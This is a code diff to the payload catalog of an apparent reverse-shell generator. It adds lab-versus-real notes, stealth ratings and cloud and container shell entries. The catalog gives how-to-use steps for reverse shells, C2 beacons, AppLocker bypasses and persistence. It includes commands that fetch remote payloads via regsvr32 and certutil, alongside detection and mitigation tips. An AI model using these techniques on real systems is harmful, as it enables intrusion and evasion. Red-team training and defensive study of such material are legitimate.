     whatItDoes: 'Uses DNS requests to send and receive data, tunnelling shell commands through DNS.',
     howToUse: 'Set up a DNS server (or use a service like dnscat2), generate the payload, run it on target.',
     whereToUse: 'When outbound HTTP/HTTPS is blocked but DNS is allowed (many networks allow DNS).',
@@ -872,22 +959,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Frequent DNS queries with long subdomain names',
       'DNS TXT records with unusual content',
-      'High volume of DNS traffic from a single host'
+      'High volume of DNS traffic from a single host',
     ],
     mitigationTips: [
       'Monitor DNS traffic for anomalies (e.g., long subdomains, high query rates)',
       'Use DNS security solutions (e.g., Cisco Umbrella)',
-      'Restrict which internal servers can perform external DNS lookups'
+      'Restrict which internal servers can perform external DNS lookups',
     ],
     references: ['https://attack.mitre.org/techniques/T1572/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'DNS shells are a classic lab technique and are still used in real red team operations, especially in environments with strict egress filtering.',
+    detectionComplexity: 'High',
+    stealthRating: 'High',
+    reliabilityRating: 'Medium',
   },
   // 18. ICMP Shell
   {
     type: 'icmp_shell',
     name: 'ICMP Shell',
     category: 'Covert Channels',
-    description: 'Uses ICMP (ping) packets to establish a covert channel.',
+    description: 'Uses ICMP (ping) packets to establish a covert channel — noisy but effective.',
     whatItDoes: 'Sends and receives commands encapsulated in ICMP echo requests/replies.',
     howToUse: 'Set up an ICMP listener (e.g., using icmpsh or custom script), generate payload, run on target.',
     whereToUse: 'When TCP and UDP are restricted, ICMP may be allowed.',
@@ -905,22 +996,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'ICMP packets with data payload (non‑standard)',
       'High volume of ICMP traffic',
-      'ICMP requests and replies with unusual patterns'
+      'ICMP requests and replies with unusual patterns',
     ],
     mitigationTips: [
       'Block ICMP where not needed (or limit to internal use)',
       'Monitor ICMP traffic for anomalies (e.g., large payloads)',
-      'Use network monitoring to detect covert channels'
+      'Use network monitoring to detect covert channels',
     ],
     references: ['https://attack.mitre.org/techniques/T1572/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'ICMP shells are a fun lab technique but are rarely used in real engagements due to their noise and limited bandwidth.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Low',
+    reliabilityRating: 'Low',
   },
   // 19. SMB Shell
   {
     type: 'smb_shell',
     name: 'SMB Shell',
     category: 'Lateral Movement',
-    description: 'Uses SMB named pipes to create a command channel.',
+    description: 'Uses SMB named pipes to create a command channel — lateral movement classic.',
     whatItDoes: 'Establishes a reverse or bind shell over SMB protocol using named pipes.',
     howToUse: 'Requires SMB access to the target. Use tools like smbexec or psexec.',
     whereToUse: 'When you have valid credentials and SMB is open, for lateral movement.',
@@ -938,22 +1033,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'SMB login events (Event ID 4624/4625) from unusual source IPs',
       'Named pipe creation related to command execution',
-      'Service creations via SMB'
+      'Service creations via SMB',
     ],
     mitigationTips: [
       'Restrict SMB to only required hosts and users',
       'Enable SMB signing and auditing',
-      'Monitor for SMB lateral movement indicators'
+      'Monitor for SMB lateral movement indicators',
     ],
     references: ['https://attack.mitre.org/techniques/T1021/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'SMB shells are a core technique for lateral movement in both labs and real Windows enterprise environments.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
   },
   // 20. SSH Shell
   {
     type: 'ssh_shell',
     name: 'SSH Reverse Tunnel',
     category: 'Lateral Movement',
-    description: 'Creates a reverse SSH tunnel to establish a shell.',
+    description: 'Creates a reverse SSH tunnel to establish a shell — a Linux administrator\'s friend.',
     whatItDoes: 'Uses SSH to create a tunnel back to your machine, giving you a shell.',
     howToUse: 'Run the SSH command with -R to forward a remote port to your machine.',
     whereToUse: 'When SSH outbound is allowed, for persistence or to bypass firewalls.',
@@ -971,22 +1070,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'SSH connections with port forwarding (-R)',
       'Unusual SSH command line arguments',
-      'SSH sessions from internal hosts to external IPs'
+      'SSH sessions from internal hosts to external IPs',
     ],
     mitigationTips: [
       'Restrict SSH port forwarding (PermitTunnel no)',
       'Monitor SSH logs for forwarding requests',
-      'Use egress filtering to block SSH to unknown external hosts'
+      'Use egress filtering to block SSH to unknown external hosts',
     ],
     references: ['https://attack.mitre.org/techniques/T1572/'],
-    isComplete: true
+    isComplete: true,
+    labVsReal: 'SSH reverse tunnels are common in both labs and real Linux environments. They\'re a reliable way to get access when SSH is available.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
   },
   // 21. PowerShell (Plain)
   {
     type: 'powershell_plain',
     name: 'PowerShell Reverse Shell (Plain)',
     category: 'Reverse Shells',
-    description: 'A simple, unencoded PowerShell reverse shell.',
+    description: 'A simple, unencoded PowerShell reverse shell — the original.',
     whatItDoes: 'Opens a TCP connection and provides a command shell via PowerShell.',
     howToUse: 'Run the command directly in PowerShell or cmd.',
     whereToUse: 'When you need a quick, simple reverse shell on Windows.',
@@ -1004,27 +1107,31 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'PowerShell command line with clear text IP/port',
       'PowerShell spawning network connections',
-      'Suspicious function names (TCPClient, GetStream)'
+      'Suspicious function names (TCPClient, GetStream)',
     ],
     mitigationTips: [
       'Enable PowerShell logging (ScriptBlock, Module)',
       'Monitor for unusual PowerShell commands',
-      'Use AMSI to block known malicious scripts'
+      'Use AMSI to block known malicious scripts',
     ],
     references: ['https://attack.mitre.org/techniques/T1059.001/'],
-    isComplete: true
+    isComplete: true,
+    labVsReal: 'The classic PowerShell reverse shell is a lab staple but is rarely used in real engagements due to its high detection rate.',
+    detectionComplexity: 'Low',
+    stealthRating: 'Low',
+    reliabilityRating: 'High',
   },
   // 22. Bash Reverse Shell
   {
     type: 'bash_reverse',
     name: 'Bash Reverse Shell',
     category: 'Reverse Shells',
-    description: 'Classic bash reverse shell using /dev/tcp.',
+    description: 'Classic bash reverse shell using /dev/tcp — the Linux lab workhorse.',
     whatItDoes: 'Uses bash built‑in /dev/tcp to connect back and spawn a shell.',
     howToUse: 'Run the command directly on a Linux target.',
     whereToUse: 'Linux environments, when you have command execution.',
     pros: ['Very simple', 'No external dependencies', 'Works on most Linux distributions'],
-    cons: ['Plaintext', 'Easily detected', 'May not work on systems without /dev/tcp (e.g., older kernels)'],
+    cons: ['Plaintext', 'Easily detected', 'May not work on systems without /dev/tcp'],
     icon: <Terminal size={18} />,
     color: 'text-emerald-300',
     defaultPort: 4444,
@@ -1037,15 +1144,19 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Bash command with /dev/tcp redirection',
       'Network connections from bash process',
-      'Suspicious use of file descriptors (>&)'
+      'Suspicious use of file descriptors (>&)',
     ],
     mitigationTips: [
       'Monitor for anomalous bash commands',
       'Restrict outbound network access from servers',
-      'Use auditd to log command execution'
+      'Use auditd to log command execution',
     ],
     references: ['https://attack.mitre.org/techniques/T1059/'],
-    isComplete: true
+    isComplete: true,
+    labVsReal: 'The bash /dev/tcp reverse shell is a lab classic. In real engagements, it\'s often used as a quick fallback when more sophisticated C2 is not available.',
+    detectionComplexity: 'Low',
+    stealthRating: 'Low',
+    reliabilityRating: 'High',
   },
   // 23. WMI Shell
   {
@@ -1070,22 +1181,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'WMI activity (Event ID 5861) from unusual sources',
       'Child processes of WmiPrvSe.exe',
-      'DCOM/RPC traffic from admin workstations to servers'
+      'DCOM/RPC traffic from admin workstations to servers',
     ],
     mitigationTips: [
       'Restrict DCOM access via GPO',
       'Enable WMI logging (WMI_Activity)',
-      'Use LAPS to randomize local admin passwords'
+      'Use LAPS to randomize local admin passwords',
     ],
     references: ['https://attack.mitre.org/techniques/T1047/', 'https://www.rapid7.com/blog/post/2013/03/09/abusing-windows-management-instrumentation-wmi-to-build-a-persistent-asyncronous-network-f/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'WMI shells are a key lateral movement technique in both labs and real Windows enterprise environments, often used as an alternative to SMB-based methods.',
+    detectionComplexity: 'High',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
   },
   // 24. WinRM Shell
   {
     type: 'winrm_shell',
     name: 'WinRM / PSRemoting',
     category: 'Lateral Movement',
-    description: 'PowerShell remoting over WinRM (port 5985/5986).',
+    description: 'PowerShell remoting over WinRM (port 5985/5986) — the modern admin\'s tool.',
     whatItDoes: 'Uses Microsoft\'s WS-Management protocol to execute PowerShell on a remote host.',
     howToUse: 'Requires admin credentials and WinRM enabled. Use Invoke-Command or Enter-PSSession.',
     whereToUse: 'Lateral movement in modern Windows environments where PSRemoting is enabled.',
@@ -1103,22 +1218,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'WinRM connections (Event ID 91)',
       'PowerShell remoting activity in logs',
-      'Network connections to port 5985/5986 from unusual sources'
+      'Network connections to port 5985/5986 from unusual sources',
     ],
     mitigationTips: [
       'Restrict WinRM via firewall and GPO',
       'Use Just Enough Administration (JEA)',
-      'Enable PowerShell remoting logging'
+      'Enable PowerShell remoting logging',
     ],
     references: ['https://attack.mitre.org/techniques/T1021/006/', 'https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/winrmsecurity'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'WinRM is increasingly used in real engagements as organizations adopt PowerShell remoting for administration, making it a reliable lateral movement technique.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
   },
   // 25. Cobalt Strike Beacon
   {
     type: 'cobalt_strike_beacon',
     name: 'Cobalt Strike Beacon',
     category: 'C2 Frameworks',
-    description: 'Commercial C2 beacon with malleable C2 profiles.',
+    description: 'Commercial C2 beacon with malleable C2 profiles — the red team standard.',
     whatItDoes: 'Establishes a C2 channel with sleep mask, malleable C2 profile, and post-exploitation features.',
     howToUse: 'Generate via Cobalt Strike Arsenal → Host on team server → Execute on target → Interact via beacon console.',
     whereToUse: 'Red team engagements, advanced persistent threat simulations.',
@@ -1135,16 +1254,20 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     commonListenerCommand: './teamserver ${lhost} password',
     detectionIndicators: [
       'Known Beacon patterns in memory',
-      'Named pipe creation (\\\\\\.\\pipe\\MSSE-*)',
-      'Sleep/jitter patterns in network traffic'
+      'Named pipe creation (\\\\\\\\.\\\\pipe\\\\MSSE-*)',
+      'Sleep/jitter patterns in network traffic',
     ],
     mitigationTips: [
       'Use EDR with Beacon detection signatures',
       'Monitor for known named pipe patterns',
-      'Implement network traffic analysis for Beacon patterns'
+      'Implement network traffic analysis for Beacon patterns',
     ],
     references: ['https://attack.mitre.org/software/S0154/', 'https://www.cobaltstrike.com/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Cobalt Strike is the gold standard for real red team operations. It\'s heavily used in professional engagements and is the benchmark for C2 frameworks.',
+    detectionComplexity: 'High',
+    stealthRating: 'High',
+    reliabilityRating: 'High',
   },
   // 26. Sliver Beacon
   {
@@ -1169,15 +1292,19 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Known Sliver patterns in memory',
       'WireGuard traffic anomalies',
-      'Encrypted C2 traffic patterns'
+      'Encrypted C2 traffic patterns',
     ],
     mitigationTips: [
       'Monitor for known Sliver signatures',
       'Implement network traffic analysis',
-      'Use EDR with behavioral detection'
+      'Use EDR with behavioral detection',
     ],
     references: ['https://github.com/BishopFox/sliver', 'https://attack.mitre.org/software/S0633/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Sliver is gaining popularity in both labs and real engagements as a free, open-source alternative to Cobalt Strike.',
+    detectionComplexity: 'High',
+    stealthRating: 'High',
+    reliabilityRating: 'High',
   },
   // 27. macOS Reverse Shell
   {
@@ -1202,22 +1329,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Network connections from Python/bash processes',
       'Suspicious terminal activity',
-      'Unauthorized network connections'
+      'Unauthorized network connections',
     ],
     mitigationTips: [
       'Enable macOS firewall and application-level controls',
       'Monitor network connections using lsof',
-      'Use endpoint detection tools (EDR)'
+      'Use endpoint detection tools (EDR)',
     ],
     references: ['https://attack.mitre.org/techniques/T1059/'],
-    isComplete: true
+    isComplete: true,
+    labVsReal: 'macOS reverse shells are common in labs and are increasingly used in real engagements as macOS becomes more prevalent in enterprise environments.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Low',
+    reliabilityRating: 'High',
   },
   // 28. MSBuild AppLocker Bypass
   {
     type: 'msbuild_applocker_bypass',
     name: 'MSBuild AppLocker Bypass',
     category: 'AppLocker / EDR Bypass',
-    description: 'Uses MSBuild.exe to execute C# code and bypass AppLocker.',
+    description: 'Uses MSBuild.exe to execute C# code and bypass AppLocker — a LOLBin classic.',
     whatItDoes: 'Leverages MSBuild.exe (trusted Microsoft binary) to run inline C# code.',
     howToUse: 'Create an XML .csproj file with inline C# code, execute via msbuild.exe.',
     whereToUse: 'AppLocker bypass, executing code in restricted Windows environments.',
@@ -1235,22 +1366,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'MSBuild.exe spawning child processes',
       'MSBuild.exe making network connections',
-      'Unusual .csproj files in temp directories'
+      'Unusual .csproj files in temp directories',
     ],
     mitigationTips: [
       'Monitor MSBuild.exe activity',
       'Enable AppLocker logging',
-      'Restrict MSBuild execution via WDAC'
+      'Restrict MSBuild execution via WDAC',
     ],
     references: ['https://attack.mitre.org/techniques/T1127/', 'https://www.trustedsec.com/blog/abusing-msbuild-to-bypass-applocker-and-execute-payloads/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'MSBuild bypass is a common lab technique and still appears in real engagements targeting locked-down Windows environments.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
   },
   // 29. Regsvr32 Squiblydoo
   {
     type: 'regsvr32_squiblydoo',
     name: 'Regsvr32 Squiblydoo',
     category: 'AppLocker / EDR Bypass',
-    description: 'Uses regsvr32.exe to download and execute a COM scriptlet.',
+    description: 'Uses regsvr32.exe to download and execute a COM scriptlet — a LOLBin classic.',
     whatItDoes: 'Executes code via regsvr32.exe using scriptlet (SCT) files from remote server.',
     howToUse: 'Host an SCT file, run regsvr32 /s /u /i:http://server/payload.sct scrobj.dll',
     whereToUse: 'AppLocker bypass, executing code in restricted Windows environments.',
@@ -1268,22 +1403,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'regsvr32.exe with /i flag to external URLs',
       'regsvr32.exe spawning child processes',
-      'Network connections from regsvr32.exe'
+      'Network connections from regsvr32.exe',
     ],
     mitigationTips: [
       'Monitor regsvr32.exe activity',
       'Enable AppLocker logging',
-      'Block regsvr32.exe using WDAC'
+      'Block regsvr32.exe using WDAC',
     ],
     references: ['https://attack.mitre.org/techniques/T1218/', 'https://www.trustedsec.com/blog/squiblydoo/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Squiblydoo is a common lab bypass technique and still appears in real engagements targeting AppLocker-restricted environments.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
   },
   // 30. Certutil Downloader
   {
     type: 'certutil_downloader',
     name: 'Certutil Downloader',
     category: 'AppLocker / EDR Bypass',
-    description: 'Uses certutil.exe to download and decode files.',
+    description: 'Uses certutil.exe to download and decode files — a classic LOLBin.',
     whatItDoes: 'Leverages certutil.exe to download files, decode base64, and execute payloads.',
     howToUse: 'Host payload (base64 encoded), run certutil -urlcache -f http://server/payload.b64 payload.b64',
     whereToUse: 'LOLBin technique, downloading files in restricted environments.',
@@ -1301,22 +1440,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'certutil.exe with -urlcache flag',
       'certutil.exe downloading from external sources',
-      'certutil.exe decoding files'
+      'certutil.exe decoding files',
     ],
     mitigationTips: [
       'Monitor certutil.exe activity',
       'Block certutil.exe network access if not needed',
-      'Enable command line logging'
+      'Enable command line logging',
     ],
     references: ['https://attack.mitre.org/techniques/T1105/', 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Certutil is a common lab downloader and is still used in real engagements as a quick way to fetch payloads on Windows.',
+    detectionComplexity: 'Low',
+    stealthRating: 'Low',
+    reliabilityRating: 'High',
   },
   // 31. Excel 4.0 Macro
   {
     type: 'excel4_macro',
     name: 'Excel 4.0 Macro (XLM)',
     category: 'Initial Access / Phishing',
-    description: 'Legacy Excel 4.0 macros for phishing and initial access.',
+    description: 'Legacy Excel 4.0 macros for phishing and initial access — the old-school trick.',
     whatItDoes: 'Uses Excel 4.0 macro language to execute commands, evading modern security controls.',
     howToUse: 'Embed in Excel file, send via phishing, victim opens and enables macros.',
     whereToUse: 'Phishing campaigns, bypassing macro detection controls.',
@@ -1334,15 +1477,19 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Excel 4.0 macro warning',
       'Excel spawning child processes',
-      'Network connections from Excel'
+      'Network connections from Excel',
     ],
     mitigationTips: [
       'Disable Excel 4.0 macros via GPO',
       'Monitor Excel process activity',
-      'Use Office 365 advanced threat protection'
+      'Use Office 365 advanced threat protection',
     ],
     references: ['https://attack.mitre.org/techniques/T1059/', 'https://blog.wooledge.org/2022/03/15/excel-4-0-macros-are-back/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Excel 4.0 macros are a common lab and real-world phishing technique, especially as organizations have gotten better at detecting VBA macros.',
+    detectionComplexity: 'High',
+    stealthRating: 'Low',
+    reliabilityRating: 'Medium',
   },
   // 32. DDE Injection
   {
@@ -1367,22 +1514,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Office processes spawning cmd.exe',
       'DDE field warnings in Office',
-      'Unusual network connections from Office'
+      'Unusual network connections from Office',
     ],
     mitigationTips: [
       'Disable DDE in Office via GPO',
       'Monitor Office process activity',
-      'Use Office 365 advanced threat protection'
+      'Use Office 365 advanced threat protection',
     ],
     references: ['https://attack.mitre.org/techniques/T1059/', 'https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'DDE injection is a classic lab technique and was widely used in real phishing campaigns before Microsoft added protections.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Low',
+    reliabilityRating: 'Low',
   },
   // 33. Donut Shellcode Generator
   {
     type: 'donut_shellcode',
     name: 'Donut Shellcode',
     category: 'AppLocker / EDR Bypass',
-    description: '.NET to shellcode generator for in-memory execution.',
+    description: '.NET to shellcode generator for in-memory execution — a modern EDR evasion tool.',
     whatItDoes: 'Converts .NET assemblies to position-independent shellcode that executes in memory.',
     howToUse: 'Generate shellcode with Donut, execute in-memory using various loaders.',
     whereToUse: 'Bypassing EDR, executing .NET payloads without disk writes.',
@@ -1400,15 +1551,19 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Process injection events',
       'Unusual RWX memory allocations',
-      'Known Donut patterns in memory'
+      'Known Donut patterns in memory',
     ],
     mitigationTips: [
       'Enable memory scanning in EDR',
       'Monitor process injection events',
-      'Use Controlled Folder Access'
+      'Use Controlled Folder Access',
     ],
     references: ['https://github.com/TheWover/donut', 'https://attack.mitre.org/techniques/T1055/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Donut is a heavily used tool in both labs and real red team operations for converting .NET payloads to shellcode for in-memory execution.',
+    detectionComplexity: 'High',
+    stealthRating: 'High',
+    reliabilityRating: 'High',
   },
   // 34. COM Hijacking
   {
@@ -1433,22 +1588,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Registry modifications to COM keys',
       'Unusual DLLs loaded via COM',
-      'Unusual process creation during COM operations'
+      'Unusual process creation during COM operations',
     ],
     mitigationTips: [
       'Monitor COM registry modifications',
       'Use Windows Defender Exploit Guard',
-      'Implement application whitelisting'
+      'Implement application whitelisting',
     ],
     references: ['https://attack.mitre.org/techniques/T1546/', 'https://www.trustedsec.com/blog/com-hijacking/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'COM hijacking is an advanced persistence technique used in both labs and real red team operations for stealthy, long-term access.',
+    detectionComplexity: 'High',
+    stealthRating: 'High',
+    reliabilityRating: 'Medium',
   },
   // 35. Task Scheduler Persistence
   {
     type: 'task_scheduler_persistence',
     name: 'Task Scheduler Persistence',
     category: 'Persistence',
-    description: 'Uses Windows Task Scheduler to maintain persistence.',
+    description: 'Uses Windows Task Scheduler to maintain persistence — a classic technique.',
     whatItDoes: 'Creates scheduled tasks that run malicious code at boot or user logon.',
     howToUse: 'Use schtasks.exe or PowerShell to create a scheduled task.',
     whereToUse: 'Persistence across reboots, maintaining access on Windows systems.',
@@ -1466,22 +1625,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Unusual scheduled tasks (schtasks.exe)',
       'Scheduled tasks with suspicious names or paths',
-      'Tasks running from temp directories'
+      'Tasks running from temp directories',
     ],
     mitigationTips: [
       'Monitor scheduled task creation',
       'Restrict schtasks.exe execution',
-      'Audit scheduled task logs'
+      'Audit scheduled task logs',
     ],
     references: ['https://attack.mitre.org/techniques/T1053/', 'https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Task Scheduler persistence is a common lab technique and is still widely used in real engagements for maintaining access on Windows systems.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
   },
   // 36. Registry Run Persistence
   {
     type: 'registry_persistence',
     name: 'Registry Run Persistence',
     category: 'Persistence',
-    description: 'Uses Windows Registry Run keys for persistence.',
+    description: 'Uses Windows Registry Run keys for persistence — the old reliable.',
     whatItDoes: 'Adds malicious entry to registry Run keys (HKLM/HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run).',
     howToUse: 'Create registry entry using reg.exe, PowerShell, or C#.',
     whereToUse: 'Persistence across logons, maintaining access on Windows.',
@@ -1499,22 +1662,26 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'Registry modifications to Run keys',
       'Suspicious entries in Run keys',
-      'Autoruns showing unknown entries'
+      'Autoruns showing unknown entries',
     ],
     mitigationTips: [
       'Monitor registry changes in Run keys',
       'Use autoruns monitoring tools',
-      'Audit registry changes'
+      'Audit registry changes',
     ],
     references: ['https://attack.mitre.org/techniques/T1547/'],
-    isComplete: false
+    isComplete: false,
+    labVsReal: 'Registry persistence is a classic lab technique and is still used in real engagements, though it\'s heavily monitored by EDR.',
+    detectionComplexity: 'Low',
+    stealthRating: 'Low',
+    reliabilityRating: 'High',
   },
   // 37. Service Persistence
   {
     type: 'service_persistence',
     name: 'Windows Service Persistence',
     category: 'Persistence',
-    description: 'Creates a Windows service for persistence.',
+    description: 'Creates a Windows service for persistence — runs with SYSTEM privileges.',
     whatItDoes: 'Creates a new Windows service that runs malicious code on boot.',
     howToUse: 'Use sc.exe, PowerShell, or C# to create a service.',
     whereToUse: 'Persistence across reboots, running as SYSTEM.',
@@ -1532,25 +1699,329 @@ const PAYLOAD_ENCYCLOPEDIA: PayloadInfo[] = [
     detectionIndicators: [
       'New service creation (sc.exe)',
       'Services with suspicious names or paths',
-      'Services running from temp directories'
+      'Services running from temp directories',
     ],
     mitigationTips: [
       'Monitor service creation events',
       'Restrict sc.exe execution',
-      'Audit service creation logs'
+      'Audit service creation logs',
     ],
     references: ['https://attack.mitre.org/techniques/T1543/', 'https://docs.microsoft.com/en-us/windows/win32/services/services'],
-    isComplete: false
-  }
-]
+    isComplete: false,
+    labVsReal: 'Service persistence is a common lab technique and is widely used in real engagements for SYSTEM-level persistence.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
+  },
+  // 38. AWS EC2 Reverse Shell
+  {
+    type: 'aws_ec2_reverse',
+    name: 'AWS EC2 Reverse Shell',
+    category: 'Cloud / Container',
+    description: 'Reverse shell tailored for AWS EC2 instances — cloud-native access.',
+    whatItDoes: 'Establishes a reverse shell from an EC2 instance using cloud-friendly methods.',
+    howToUse: 'Deploy via user-data, SSM, or direct execution on the EC2 instance.',
+    whereToUse: 'Cloud pentesting, AWS environment assessments.',
+    pros: ['Works in cloud environments', 'Can leverage instance metadata', 'Bypasses some traditional controls'],
+    cons: ['Requires instance access', 'Cloud logging may capture activity', 'Limited by IAM permissions'],
+    icon: <Cloud size={18} />,
+    color: 'text-orange-300',
+    defaultPort: 4444,
+    requiresLhost: true,
+    requiresLport: true,
+    supportedFormats: ['python', 'bash', 'go'],
+    howItWorks: 'Uses Python or bash to connect back to a listener, often using instance metadata for reconnaissance.',
+    exampleScenario: 'Gain initial access to an EC2 instance via a vulnerable web app, then establish a reverse shell.',
+    commonListenerCommand: 'nc -lvnp ${lport}',
+    detectionIndicators: [
+      'Unusual outbound connections from EC2 instances',
+      'Instance metadata queries from non-standard sources',
+      'User-data script modifications',
+    ],
+    mitigationTips: [
+      'Restrict outbound traffic from EC2 instances',
+      'Monitor CloudTrail for suspicious API calls',
+      'Use AWS GuardDuty for threat detection',
+    ],
+    references: ['https://attack.mitre.org/techniques/T1071/', 'https://aws.amazon.com/security/'],
+    isComplete: false,
+    labVsReal: 'AWS reverse shells are increasingly common in real cloud-focused red team engagements as more organizations move to the cloud.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
+  },
+  // 39. GCP Compute Reverse Shell
+  {
+    type: 'gcp_compute_reverse',
+    name: 'GCP Compute Reverse Shell',
+    category: 'Cloud / Container',
+    description: 'Reverse shell for Google Cloud Compute Engine VMs.',
+    whatItDoes: 'Opens a reverse shell from a GCP VM using Python or bash.',
+    howToUse: 'Execute on the VM via SSH, serial console, or startup script.',
+    whereToUse: 'Cloud pentesting, GCP environment assessments.',
+    pros: ['Works in GCP environments', 'Leverages metadata service', 'Can use cloud SDK'],
+    cons: ['Requires VM access', 'Cloud logging captures activity', 'Limited by IAM'],
+    icon: <Cloud size={18} />,
+    color: 'text-blue-300',
+    defaultPort: 4444,
+    requiresLhost: true,
+    requiresLport: true,
+    supportedFormats: ['python', 'bash'],
+    howItWorks: 'Uses Python socket or bash /dev/tcp to connect back, often using GCP metadata for reconnaissance.',
+    exampleScenario: 'Access a GCP VM via a compromised service account, then establish a reverse shell.',
+    commonListenerCommand: 'nc -lvnp ${lport}',
+    detectionIndicators: [
+      'Unusual outbound connections from GCP VMs',
+      'Metadata queries from non-standard sources',
+      'Startup script modifications',
+    ],
+    mitigationTips: [
+      'Restrict outbound traffic from VMs',
+      'Monitor Cloud Audit Logs',
+      'Use VPC firewall rules',
+    ],
+    references: ['https://attack.mitre.org/techniques/T1071/', 'https://cloud.google.com/security/'],
+    isComplete: false,
+    labVsReal: 'GCP reverse shells are used in real cloud red team engagements targeting Google Cloud environments.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
+  },
+  // 40. Azure VM Reverse Shell
+  {
+    type: 'azure_vm_reverse',
+    name: 'Azure VM Reverse Shell',
+    category: 'Cloud / Container',
+    description: 'Reverse shell for Azure Virtual Machines.',
+    whatItDoes: 'Establishes a reverse shell from an Azure VM using Python, PowerShell, or bash.',
+    howToUse: 'Deploy via VM extensions, custom script, or direct execution.',
+    whereToUse: 'Cloud pentesting, Azure environment assessments.',
+    pros: ['Works in Azure environments', 'Leverages Instance Metadata Service (IMDS)', 'Can use Azure CLI'],
+    cons: ['Requires VM access', 'Azure logging captures activity', 'Limited by RBAC'],
+    icon: <Cloud size={18} />,
+    color: 'text-blue-400',
+    defaultPort: 4444,
+    requiresLhost: true,
+    requiresLport: true,
+    supportedFormats: ['powershell', 'python', 'bash'],
+    howItWorks: 'Uses Python, PowerShell, or bash to connect back to a listener, often using IMDS for reconnaissance.',
+    exampleScenario: 'Compromise an Azure VM via a vulnerable web app, then establish a reverse shell.',
+    commonListenerCommand: 'nc -lvnp ${lport}',
+    detectionIndicators: [
+      'Unusual outbound connections from Azure VMs',
+      'IMDS queries from non-standard sources',
+      'Custom script extension activity',
+    ],
+    mitigationTips: [
+      'Restrict outbound traffic using NSGs',
+      'Monitor Azure Activity Logs',
+      'Use Azure Sentinel for threat detection',
+    ],
+    references: ['https://attack.mitre.org/techniques/T1071/', 'https://azure.microsoft.com/en-us/security/'],
+    isComplete: false,
+    labVsReal: 'Azure reverse shells are increasingly common in real cloud-focused red team engagements.',
+    detectionComplexity: 'Medium',
+    stealthRating: 'Medium',
+    reliabilityRating: 'High',
+  },
+  // 41. Docker Reverse Shell
+  {
+    type: 'docker_reverse',
+    name: 'Docker Container Reverse Shell',
+    category: 'Cloud / Container',
+    description: 'Reverse shell from within a Docker container.',
+    whatItDoes: 'Opens a reverse shell from a compromised container to your listener.',
+    howToUse: 'Execute within a container via exec or entrypoint.',
+    whereToUse: 'Container pentesting, Kubernetes environments.',
+    pros: ['Works in containerized environments', 'Can escape containers in some cases', 'Lightweight'],
